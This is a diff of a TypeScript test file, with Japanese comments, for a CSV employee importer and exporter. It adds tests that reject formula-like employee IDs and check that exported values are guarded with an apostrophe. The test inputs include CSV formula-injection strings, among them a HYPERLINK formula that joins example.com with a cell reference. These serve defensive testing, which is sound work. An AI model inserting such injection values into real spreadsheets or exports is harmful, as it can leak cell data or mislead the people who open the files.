@@ -91,13 +91,24 @@ test('importEmployees: 社員番号の重複を検出', () => {
 })
 
 test('importEmployees: クォート付きフィールド（カンマ・二重引用符を含む社員番号）を取り込める（RFC4180・B-6）', () => {
-  const csv = [HEADER, '"=HYPERLINK(""http://example.com/""&A1,""click"")",70,62,56,49,7.4'].join('\n')
+  const csv = [HEADER, '"E001,追加 ""special""",70,62,56,49,7.4'].join('\n')
   const { employees, errors } = importEmployees(csv, 1)
   assert.equal(errors.length, 0)
-  assert.equal(employees?.[0].id, '=HYPERLINK("http://example.com/"&A1,"click")')
+  assert.equal(employees?.[0].id, 'E001,追加 "special"')
 })
 
-test('buildAssignmentCsv → importEmployees: フォーミュラインジェクション対象のIDが往復で保存される（B-6）', () => {
+test('importEmployees: クォート内にカンマを含む数式IDは1フィールドとして解釈された上で弾かれる（RFC4180・B-6）', () => {
+  // パーサがクォートを理解していなければ「列数不一致」になる。
+  // 「社員番号が不正」で止まることが、1フィールドとして正しく読めた証拠になる。
+  const csv = [HEADER, '"=HYPERLINK(""http://example.com/""&A1,""click"")",70,62,56,49,7.4'].join('\n')
+  const { employees, errors } = importEmployees(csv, 1)
+  assert.equal(employees, null)
+  assert.equal(errors.length, 1)
+  assert.equal(errors[0].column, '社員番号')
+  assert.equal(errors[0].actual, '=HYPERLINK("http://example.com/"&A1,"click")')
+})
+
+test('buildAssignmentCsv: フォーミュラインジェクション対象のIDには出力時に \' を前置する（B-6）', () => {
   const emps: Employee[] = [
     { id: '=1+1', sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 },
     { id: '+1+1', sales: 65, mgmt: 70, dev: 50, training: 45, cost: 7.3 },
@@ -105,23 +116,62 @@ test('buildAssignmentCsv → importEmployees: フォーミュラインジェク�
     { id: '@SUM(1+1)', sales: 75, mgmt: 60, dev: 58, training: 50, cost: 7.1 },
   ]
   const assign: Record<string, UnitId> = { '=1+1': 'A', '+1+1': 'A', '-1+1': 'A', '@SUM(1+1)': 'A' }
-  const result = computeSimulationResult(assign, emps)
-  const csv = buildAssignmentCsv(emps, result)
+  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))
 
-  // 出力側：数式評価を防ぐため ' を前置してから表計算ソフトに渡す
+  // 出力側：数式評価を防ぐため ' を前置してから表計算ソフトに渡す（多層防御として維持する）
   const lines = csv.split('\n')
   assert.ok(lines[1].startsWith("'=1+1,"))
   assert.ok(lines[2].startsWith("'+1+1,"))
   assert.ok(lines[3].startsWith("'-1+1,"))
   assert.ok(lines[4].startsWith("'@SUM(1+1),"))
+})
 
-  // 入力側：再取込で元のIDに戻る（往復互換）
+test('importEmployees: 数式に見える社員番号は取込エラーにする', () => {
+  // 数式に見えるIDは取込事故の典型なので、値を黙って受け入れず入力検証で報告する。
+  // これにより `採用03_CSV数式インジェクション.csv` は「列数不一致」ではなく
+  // 「社員番号が不正」という正しい理由で保留される。
+  const csv = [HEADER, '=1+1,70,60,55,50,7', 'E002,70,60,55,50,7'].join('\n')
+  const { employees, errors } = importEmployees(csv, 2)
+  assert.equal(employees, null)
+  const idErrors = errors.filter((e) => e.column === '社員番号')
+  assert.equal(idErrors.length, 1)
+  assert.equal(idErrors[0].row, 1)
+  assert.equal(idErrors[0].actual, '=1+1')
+})
+
+test('importEmployees: 空の社員番号は取込エラーにする', () => {
+  // id は assignment のキー。空だと複数人が同一キーに潰れて配置が壊れるため必ず弾く。
+  const csv = [HEADER, ',70,60,55,50,7', '  ,70,60,55,50,7'].join('\n')
+  const { employees, errors } = importEmployees(csv, 2)
+  assert.equal(employees, null)
+  assert.equal(errors.filter((e) => e.column === '社員番号' && e.actual === '(空)').length, 2)
+})
+
+test("buildAssignmentCsv → importEmployees: ' 始まりのIDが往復で欠けない", () => {
+  // ガードを可逆にする前は、'=A1 が出力時にガード対象外と判定され、
+  // 再取込で先頭の ' をガードと誤認して剥がされ =A1 に化けていた。
+  const emps: Employee[] = [
+    { id: "'=A1", sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 },
+    { id: "'普通のID", sales: 65, mgmt: 70, dev: 50, training: 45, cost: 7.3 },
+    { id: "'", sales: 68, mgmt: 55, dev: 62, training: 52, cost: 6.5 },
+  ]
+  const assign: Record<string, UnitId> = { "'=A1": 'A', "'普通のID": 'A', "'": 'A' }
+  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))
   const { employees: back, errors } = importEmployees(csv, emps.length)
   assert.equal(errors.length, 0)
   assert.deepEqual(
     back?.map((e) => e.id),
     emps.map((e) => e.id),
   )
+})
+
+test('buildAssignmentCsv → importEmployees: カンマ・引用符・改行を含む値が往復で保存される', () => {
+  const emps: Employee[] = [{ id: 'A,B "C"\nD', sales: 70, mgmt: 60, dev: 55, training: 50, cost: 7 }]
+  const assign: Record<string, UnitId> = { 'A,B "C"\nD': 'A' }
+  const csv = buildAssignmentCsv(emps, computeSimulationResult(assign, emps))
+  const { employees: back, errors } = importEmployees(csv, 1)
+  assert.equal(errors.length, 0)
+  assert.equal(back?.[0].id, 'A,B "C"\nD')
 })
 
 test('buildAssignmentCsv: ヘッダと配置先を含む', () => {
